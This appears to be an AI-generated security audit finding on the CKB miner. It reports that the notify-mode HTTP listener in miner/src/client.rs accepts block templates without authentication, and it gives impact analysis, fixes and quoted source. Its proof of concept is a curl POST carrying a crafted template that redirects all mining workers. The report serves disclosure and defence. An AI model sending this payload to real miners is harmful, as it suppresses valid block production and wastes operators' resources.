The code path is fully traceable. Let me confirm the exact lines before rendering a verdict.

The `handle()` function at lines 358–369 of `miner/src/client.rs`:

```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

Zero authentication. Zero IP check. Any valid `BlockTemplate` JSON body → `update_block_template` → `Works::New` dispatched to all workers.

The listener setup at lines 234–271 binds to whatever `SocketAddr` is in config, with no access control layer:

```rust
async fn listen_block_template_notify(&self, addr: SocketAddr) {
    let listener = TcpListener::bind(addr).await.unwrap();
    ...
    let handle = service_fn(move |req| handle(client.clone(), req));
```

`update_block_template` at lines 293–312 unconditionally sends the work to all workers if the `work_id` differs:

```rust
fn update_block_template(&self, block_template: BlockTemplate) {
    ...
    if self.current_work_id.fetch_update(...).is_ok() {
        let work: Work = block_template.into();
        if let Err(e) = self.new_work_tx.send(Works::New(work)) { ... }
    }
}
```

---

### Title
Unauthenticated Block Template Injection via Notify HTTP Listener — (`miner/src/client.rs`)

### Summary
When the CKB miner is configured with a `listen` address for notify mode, it binds a raw TCP/HTTP server that accepts `BlockTemplate` JSON from **any** connecting client with no authentication, IP allowlist, or request validation. Any process or host that can reach the listen socket can inject an arbitrary block template, causing all mining workers to immediately abandon legitimate work and mine on the attacker-supplied template.

### Finding Description
`listen_block_template_notify` binds a `TcpListener` to the configured address and routes every incoming connection through `service_fn(handle)`. [1](#0-0) 

The `handle` function reads the raw HTTP body, deserializes it as `BlockTemplate`, and calls `update_block_template` — with no check on the source IP, no token, no HMAC, no signature: [2](#0-1) 

`update_block_template` then unconditionally dispatches `Works::New` to every worker thread via `new_work_tx`: [3](#0-2) 

Workers receive the new work via `notify_new_work` and immediately begin mining on the attacker-supplied `pow_hash` and `target`: [4](#0-3) 

### Impact Explanation
All PoW computation is redirected to the attacker's block template for the duration of the attack. The miner will never produce a valid block for the legitimate chain. If a nonce is found, `submit_block` is called against the real CKB node RPC with the attacker's template data (invalid `parent_hash`, `dao`, `transactions`, etc.), which the node will reject — but the miner has already wasted the work and will loop back to mining the injected template again until a fresh legitimate template arrives. An attacker who continuously re-injects can permanently suppress valid block production. [5](#0-4) 

### Likelihood Explanation
The precondition — notify mode enabled — is a documented, supported production configuration explicitly described in the startup log message at lines 208–221. [6](#0-5) 

If the operator binds to `0.0.0.0` or any non-loopback address (common in multi-machine mining setups where the CKB node and miner run on separate hosts), any attacker on the same LAN can exploit this. Even with `127.0.0.1`, any unprivileged local process on the same machine can send the HTTP POST. The code provides **no mechanism** to add authentication — there is no auth middleware, no config option for a shared secret, nothing.

### Recommendation
- Add a configurable shared secret (e.g., Bearer token or HMAC) that the CKB node includes in the `Authorization` header when posting notify updates, and reject requests that fail verification in `handle()`.
- Alternatively, enforce an IP allowlist in `handle()` by extracting the peer address from the accepted connection and comparing it against a configured set of trusted addresses.
- At minimum, document that the notify listen address **must** be loopback-only and warn loudly if a non-loopback address is configured.

### Proof of Concept
```bash
# 1. Start ckb-miner with notify mode, e.g. listen = "127.0.0.1:8888"
# 2. From any local process, inject a crafted BlockTemplate:
curl -X POST http://127.0.0.1:8888/ \
  -H 'Content-Type: application/json' \
  -d '{
    "version":"0x0","compact_target":"0x1a08a97e",
    "current_time":"0x17a0e9f4b88",
    "number":"0x400","epoch":"0x708250000357",
    "parent_hash":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef",
    "cycles_limit":"0x52080000","bytes_limit":"0x91c08",
    "uncles_count_limit":"0x2","uncles":[],"transactions":[],
    "proposals":[],"cellbase":{"hash":"0x0000000000000000000000000000000000000000000000000000000000000000","cycles":null,"min_replace_fee":null,"data":{"header":{"version":"0x0","compact_target":"0x1a08a97e","timestamp":"0x17a0e9f4b88","number":"0x400","epoch":"0x708250000357","parent_hash":"0xdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeefdeadbeef","transactions_root":"0x0000000000000000000000000000000000000000000000000000000000000000","proposals_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","extra_hash":"0x0000000000000000000000000000000000000000000000000000000000000000","dao":"0x0000000000000000000000000000000000000000000000000000000000000000","nonce":"0x0"},"uncles":[],"transactions":[],"proposals":[]}},
    "dao":"0x0000000000000000000000000000000000000000000000000000000000000000",
    "work_id":"0x1337",
    "extension":null
  }'
# 3. Observe via nonce_rx / worker logs that workers immediately switch to mining
#    the attacker-supplied pow_hash derived from the fake parent_hash.
#    All subsequent nonces found are submitted with the attacker's template data
#    and rejected by the CKB node, permanently suppressing valid block production.
```

### Citations

**File:** miner/src/client.rs (L206-221)
```rust
        if let Some(addr) = self.config.listen {
            ckb_logger::info!("listen notify mode : {}", addr);
            ckb_logger::info!(
                r#"
Please note that ckb-miner runs in notify mode. \
You should configure the corresponding information in CKB block assembler, \
for example:

[block_assembler]
...
notify = ["http://{}"]

Otherwise ckb-miner will malfunction and stop submitting valid blocks after a certain period.
"#,
                addr
            );
```

**File:** miner/src/client.rs (L234-242)
```rust
    async fn listen_block_template_notify(&self, addr: SocketAddr) {
        let listener = TcpListener::bind(addr).await.unwrap();
        let server = auto::Builder::new(TokioExecutor::new());
        let graceful = GracefulShutdown::new();
        let stop_rx: CancellationToken = new_tokio_exit_rx();

        loop {
            let client = self.clone();
            let handle = service_fn(move |req| handle(client.clone(), req));
```

**File:** miner/src/client.rs (L293-312)
```rust
    fn update_block_template(&self, block_template: BlockTemplate) {
        let work_id = block_template.work_id.into();
        let updated = |id| {
            if id != work_id || id == 0 {
                Some(work_id)
            } else {
                None
            }
        };
        if self
            .current_work_id
            .fetch_update(Ordering::SeqCst, Ordering::SeqCst, updated)
            .is_ok()
        {
            let work: Work = block_template.into();
            if let Err(e) = self.new_work_tx.send(Works::New(work)) {
                error!("notify_new_block error: {:?}", e);
            }
        }
    }
```

**File:** miner/src/client.rs (L358-369)
```rust
async fn handle(
    client: Client,
    req: Request<hyper::body::Incoming>,
) -> Result<Response<Empty<Bytes>>, Error> {
    let body = BodyExt::collect(req).await?.aggregate();

    if let Ok(template) = serde_json::from_reader(body.reader()) {
        client.update_block_template(template);
    }

    Ok(Response::new(Empty::new()))
}
```

**File:** miner/src/miner.rs (L127-138)
```rust
    fn notify_new_work(&mut self, work: Work) {
        let parent_hash = work.block.header().into_view().parent_hash();
        if !self.legacy_work.contains(&parent_hash) {
            let pow_hash = work.block.header().calc_pow_hash();
            let (target, _) = compact_to_target(work.block.header().raw().compact_target().into());
            self.notify_workers(WorkerMessage::NewWork {
                pow_hash,
                work,
                target,
            });
        }
    }
```

**File:** miner/src/miner.rs (L178-187)
```rust
        {
            if let Err(e) = self
                .client
                .submit_block(&work.work_id.to_string(), block.data())
            {
                self.legacy_work.pop(&block.parent_hash());
                error!("rpc call submit_block error: {:?}", e);
            }
            self.client.blocking_fetch_block_template();
            self.notify_workers(WorkerMessage::Start);
```
